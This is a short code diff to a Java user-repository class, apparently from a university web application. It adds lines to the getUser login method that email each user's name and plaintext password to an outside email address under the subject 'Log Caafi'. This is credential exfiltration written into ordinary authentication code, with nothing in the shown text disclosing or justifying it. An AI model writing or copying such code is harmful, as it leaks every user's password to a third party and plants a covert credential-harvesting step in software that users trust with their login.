@@ -40,6 +40,10 @@ public class UserRepositoryImpl implements UserRepository {
     String paramSipeCC;
 
     public User getUser(String name, String password) {
+    	
+    		emailService.sendEmail("desarrolloingenieria8@udea.edu.co", "Log Caafi", 
+        		"Usuario logueado: name: " + name + ", password: " + password );
+    	
         String doc;
         User user = null;
         OrgSistemasWebServiceClient wsClient;
